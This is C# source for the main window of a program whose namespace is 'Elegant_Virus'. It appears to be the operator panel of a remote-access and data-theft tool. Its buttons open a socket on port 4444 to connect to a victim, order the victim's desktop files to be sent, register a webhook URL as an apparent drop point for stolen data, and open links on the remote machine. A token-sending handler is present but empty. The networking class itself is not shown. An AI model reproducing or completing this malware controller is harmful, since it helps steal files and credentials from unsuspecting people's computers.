using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Elegant_Virus
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public bool Connection { get; set; }
        public string WebHock { get; set; }
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Window_Activated(object sender, EventArgs e)
        {
            try
            {
                MouseLeftButtonDown += delegate
                {
                    try
                    {
                        DragMove();

                    }catch (Exception ex)
                    {
                    }
                };
            }
            catch (Exception)
            {}
        }

        private void btnExit_Click(object sender, RoutedEventArgs e)
        {
            Environment.Exit(0);
        }

        private void btnMax_Click(object sender, RoutedEventArgs e)
        {
            if(WindowState == WindowState.Maximized)
            {
                WindowState = WindowState.Normal;
            }
            else
            {
                WindowState=WindowState.Maximized;
            }
        }

        private void btnMin_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void btnSendFiles_Click(object sender, RoutedEventArgs e)
        {
            if(Connection)
            {
                var ip = IPAddress.Any;
                server server = new server(ip, 4444, 2);//in send socket status = 2 : send desktop Files

                server.sendrequst();

            }
            else
            {
                MessageBox.Show("No Connection!");
            }
        }

        private async void btnCon_Click(object sender, RoutedEventArgs e)
        {
            if (WebHock == null)
            {
                MessageBox.Show("You Not Enter WebHock!,");
            }
            else
            {




                lblWait.Content = "Wait For Connection...";


            await Task.Delay(TimeSpan.FromSeconds(2));

            var ip = IPAddress.Any;





            server server = new server(ip, 4444, 1);//in send socket status = 1 :CONNECTION WITH IP
            server.sendrequst();







            lableIP.Content = "IP : " + server.IP ;
            Connection = server.Connected;
            
            if(Connection == true)
            {
                lblStatus.Content = "online";
                lblWait.Content = "Connected!";
               await Task.Delay(TimeSpan.FromSeconds(3));
                lblWait.Visibility = Visibility.Hidden;

            }
            else
            {
                lblStatus.Content = "ofline";

            }
            }
        }


        private void btnSendToken_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private async void btnWebhook_Click(object sender, RoutedEventArgs e)
        {
            var ip = IPAddress.Any;
            server server = new server(ip, 4444, 3,txtWebhook.Text);//in send socket status = 3 : webhock


            server.sendrequst();
            WebHock = server.webhock;
        }

        private void btnOpenWeb_Click(object sender, RoutedEventArgs e)
        {
            var ip = IPAddress.Any;
            server server = new server(ip, 4444, 4, txt.Text);//in send socket status = 4 : open link


            server.sendrequst();
            WebHock = server.webhock;
        }
    }
}
